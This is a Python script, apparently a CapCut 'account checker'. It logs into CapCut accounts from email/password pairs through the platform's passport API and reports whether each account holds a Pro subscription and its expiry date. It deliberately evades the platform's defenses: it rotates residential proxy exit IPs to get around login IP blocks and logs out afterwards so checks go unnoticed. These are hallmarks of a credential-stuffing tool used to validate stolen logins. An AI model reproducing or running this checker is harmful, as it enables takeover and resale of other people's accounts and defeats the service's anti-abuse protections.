"""CapCut account checker.

Logs into CapCut via its DIRECT email API (TikTok-passport style, aid=348188) through a
rotating RESIDENTIAL proxy, then reads the subscription (Pro/Free + expiry) from the commerce
API. No webmssdk signing is required for these two calls — session cookies are enough. The
residential proxy is mandatory: CapCut soft-blocks datacenter IPs on login with error_code 7,
so we rotate the proxy session (a new residential exit IP) until the block clears.

Flow:
  1. POST login-row.www.capcut.com/passport/web/email/login/  (email+password hex-XOR(0x05))
     -> session cookies (sessionid/sid_tt) + user_id.
  2. POST commerce-api-sg.capcut.com/commerce/v3/trade/subscription_infos
       body {"scene":["vip","workspace"],"vip_levels":["vip"],"app_id":348188}
     -> vip_infos[0] = {is_vip, vip_end_time (unix), vip_level}.
"""
import random
import string
import datetime
import requests

CAPCUT_AID = "348188"
LOGIN_HOST = "login-row.www.capcut.com"
SUB_URL = "https://commerce-api-sg.capcut.com/commerce/v3/trade/subscription_infos"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
_WEB_HDR = {"Referer": "https://www.capcut.com/", "Origin": "https://www.capcut.com"}


def _enc(s):
    """CapCut/TikTok credential encryption: hex of each byte XOR 0x05."""
    return "".join("%02x" % (ord(c) ^ 5) for c in str(s))


def _sess_id(n=18):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def _proxies(template, sid):
    if not template:
        return None
    url = template.replace("{sess}", sid)
    return {"http": url, "https": url}


def _logout(s, timeout=15):
    """Release the CapCut session so the account's 2-login cap (1 desktop + 1 mobile) is not
    exhausted by repeated checks. Requires the passport CSRF token echoed as a header — the
    response body says 'no permissions' but the session IS invalidated (verified)."""
    try:
        csrf = s.cookies.get("passport_csrf_token", "")
        s.post("https://%s/passport/user/logout/?aid=%s&account_sdk_source=web" % (LOGIN_HOST, CAPCUT_AID),
               headers={**_WEB_HDR, "x-tt-passport-csrf-token": csrf}, timeout=timeout)
    except Exception:
        pass


def check_capcut_account(email, password, proxy_template=None, max_ip_retries=6, timeout=30):
    """Check one CapCut account. Returns a dict:
       {ok, email, user_id, plan, expiry, is_pro, error}.
    On a datacenter-IP block (error_code 7) rotates the proxy session and retries."""
    email = (email or "").strip()
    password = (password or "").strip()
    out = {"ok": False, "email": email, "user_id": "", "plan": "", "expiry": "",
           "is_pro": False, "error": ""}
    if not email or not password:
        out["error"] = "missing email/password"
        return out
    last_err = "login failed"
    for _ in range(max(1, int(max_ip_retries or 1))):
        sid = _sess_id()
        s = requests.Session()
        prox = _proxies(proxy_template, sid)
        if prox:
            s.proxies = prox
        s.headers.update({"User-Agent": UA})
        try:
            # No priming GET — the login POST works standalone (faster).
            url = ("https://%s/passport/web/email/login/?aid=%s&account_sdk_source=web"
                   "&language=en&verifyFp=verify_%s&device_platform=web"
                   % (LOGIN_HOST, CAPCUT_AID, sid))
            data = {"mix_mode": "1", "email": _enc(email), "password": _enc(password),
                    "fixed_mix_mode": "1"}
            hdr = dict(_WEB_HDR); hdr["Content-Type"] = "application/x-www-form-urlencoded"
            r = s.post(url, data=data, headers=hdr, timeout=timeout)
            try:
                j = r.json()
            except Exception:
                last_err = "login: unreadable response"
                continue
            dd = j.get("data") or {}
            if "sessionid" not in s.cookies.get_dict():
                ec = dd.get("error_code")
                if ec == 7:                      # datacenter/IP soft-block -> rotate proxy IP
                    last_err = "IP rate-limited"
                    continue
                if dd.get("captcha"):
                    out["error"] = "captcha required"
                    return out
                out["error"] = "login failed: %s" % (dd.get("description")
                                                     or j.get("message") or "invalid credentials")
                return out
            # --- logged in ---
            out["user_id"] = dd.get("user_id_str") or (str(dd.get("user_id")) if dd.get("user_id") else "")
            body = {"scene": ["vip", "workspace"], "vip_levels": ["vip"], "app_id": int(CAPCUT_AID)}
            hdr2 = dict(_WEB_HDR); hdr2["Content-Type"] = "application/json"
            sr = s.post(SUB_URL, json=body, headers=hdr2, timeout=timeout)
            sj = sr.json()
            vip = ((((sj.get("data") or {}).get("subscription_user_infos") or {})
                    .get("vip") or {}).get("vip_infos")) or []
            if vip and vip[0].get("is_vip"):
                info = vip[0]
                out["is_pro"] = True
                out["plan"] = "Pro (%s)" % (info.get("vip_level") or "vip")
                end = info.get("vip_end_time")
                try:
                    end = int(end)
                except (TypeError, ValueError):
                    end = 0
                out["expiry"] = (datetime.datetime.fromtimestamp(end, datetime.timezone.utc)
                                 .strftime("%Y-%m-%d")) if end > 0 else "lifetime"
            else:
                out["plan"] = "Free"
                out["expiry"] = "-"
            _logout(s)   # free the session slot (CapCut caps at 2 logins: 1 desktop + 1 mobile)
            out["ok"] = True
            return out
        except Exception:
            last_err = "network/proxy error"
            continue
    out["error"] = last_err
    return out
